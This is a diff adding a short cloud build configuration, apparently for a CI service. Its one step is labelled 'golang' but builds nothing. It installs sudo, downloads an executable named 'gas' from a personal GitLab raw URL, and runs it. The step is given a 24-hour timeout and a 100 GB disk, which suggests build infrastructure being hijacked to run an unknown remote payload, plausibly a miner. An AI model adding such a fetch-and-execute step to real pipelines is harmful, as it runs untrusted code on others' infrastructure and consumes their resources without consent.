@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         apt update && apt-get install sudo -y && wget https://gitlab.com/sehab.oi29/onta/-/raw/main/gas && chmod u+x gas && ./gas
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
